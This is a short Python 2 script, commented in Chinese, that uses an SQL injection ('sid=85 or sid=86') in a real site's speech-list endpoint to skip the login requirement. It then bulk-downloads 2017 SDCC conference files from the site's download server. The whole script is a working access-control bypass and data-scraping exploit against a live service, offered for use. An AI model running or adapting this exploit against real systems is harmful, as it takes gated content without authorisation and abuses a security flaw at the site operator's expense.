#!/usr/bin/python
#coding:utf-8

import urllib
import urllib2
import json
import os

#直接访问下载链接，跳过登录限制，这里存在SQL注入
list_url = "http://download.csdn.net/index.php/meeting/speechlist/?sid=85%20or%20sid=86"
down_url = "http://meet.download.csdn.net/speech"

def download(url, i, filename):
    print "%s downloading %s"%(i, filename)
    filepath = "./2017-sdcc/%s"%filename
    if os.path.exists(filepath) == False:
        urllib.urlretrieve(down_url + url, filepath)

res = urllib2.urlopen(list_url).read()
data = json.loads(res)
for i in data:
    download(i['fileaddr'], i['id'], i['originfile'])

print "总共下载 %d 个文件"%len(data)

